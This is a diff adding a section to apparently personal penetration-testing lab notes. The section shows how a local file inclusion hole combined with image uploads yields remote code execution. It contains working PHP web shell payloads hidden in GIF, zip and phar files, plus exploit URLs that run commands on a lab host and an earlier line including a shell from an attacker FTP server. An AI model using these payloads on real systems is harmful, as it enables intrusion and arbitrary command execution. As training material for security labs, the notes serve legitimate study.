@@ -194,3 +194,85 @@ http://10.129.196.211/index.php?language=ftp://10.10.15.34/shell.php&cmd=id
 <figure><img src="../../../.gitbook/assets/image (1388).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (1389).png" alt=""><figcaption></figcaption></figure>
+
+## LFI and File Uploads
+
+If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it. For example we upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
+
+| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
+| ---------------------------- | :--------------: | :---------: | :------------: |
+| **PHP**                      |                  |             |                |
+| `include()`/`include_once()` |         ✅        |      ✅      |        ✅       |
+| `require()`/`require_once()` |         ✅        |      ✅      |        ❌       |
+| **NodeJS**                   |                  |             |                |
+| `res.render()`               |         ✅        |      ✅      |        ❌       |
+| **Java**                     |                  |             |                |
+| `import`                     |         ✅        |      ✅      |        ✅       |
+| **.NET**                     |                  |             |                |
+| `include`                    |         ✅        |      ✅      |        ✅       |
+
+To craft a malicious image, we must not forget the image magic byte just in case the upload form checks for both the extension and content type as well.
+
+```shell-session
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+Then we upload our image and look were it has been uplaoded in the source code ->
+
+```html
+<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+```
+
+And if we combine this to our LFI, we can get RCE ->
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Let's utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work.
+
+```shell-session
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+
+Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded)
+
+And the URL will look like:
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+
+Now we can try and use the `phar://` wrapper to achieve a similar result:
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+next we need to compile into a `phar` file and rename it to `shell.jpg`
+
+```shell-session
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+
+And we can call it like this:
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+
+_**Use any of the techniques covered in this section to gain RCE and read the flag at /**_
+
+<figure><img src="../../../.gitbook/assets/image (1390).png" alt=""><figcaption></figcaption></figure>
+
+```
+http://83.136.255.43:42260/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
+```
